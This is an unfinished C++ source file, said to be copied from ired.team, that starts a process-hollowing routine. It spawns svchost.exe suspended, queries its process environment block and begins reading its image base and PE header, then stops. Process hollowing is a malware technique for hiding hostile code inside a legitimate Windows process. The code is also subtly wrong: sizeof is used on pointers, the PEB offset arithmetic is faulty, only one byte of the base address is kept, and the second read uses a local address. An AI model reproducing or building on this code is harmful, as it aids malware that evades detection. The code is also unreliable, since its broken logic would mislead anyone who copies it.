// Copied from ired.team
// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <winternl.h>

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main()
{
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	auto res = CreateProcessA(nullptr,
		(LPSTR)"C:\\Windows\\System32\\svchost.exe",
		nullptr,
		nullptr,
		FALSE,
		CREATE_SUSPENDED,
		nullptr, 
		nullptr,
		si,
		pi);

	PROCESS_BASIC_INFORMATION* bi = new PROCESS_BASIC_INFORMATION();
	DWORD temp = 0;
	HANDLE hProcess = pi->hProcess;
	NtQueryInformationProcess(hProcess, ProcessBasicInformation, bi, sizeof(PROCESS_BASIC_INFORMATION), &temp);

	auto *ptrToImageBase = bi->PebBaseAddress + 0x10;

	auto addrBuf = new byte[sizeof(PROCESS_BASIC_INFORMATION)];
	auto nRead = nullptr;
	ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, sizeof(addrBuf), nRead);

	auto svchostBase = *addrBuf;

	auto data = new byte[0x200];
	ReadProcessMemory(hProcess, &svchostBase, data, sizeof(data), nRead);

	//auto e_lfanew_offset = ;
	auto temp_arr = new byte[(unsigned int)sizeof(data) - 0x3c];
	for (int i = 0; i < sizeof(temp_arr); i++)
	{
		temp_arr[i] = data[i + 0x3c];
	}
	auto* e_lfanew_offset = &temp_arr;



	return 0;
}
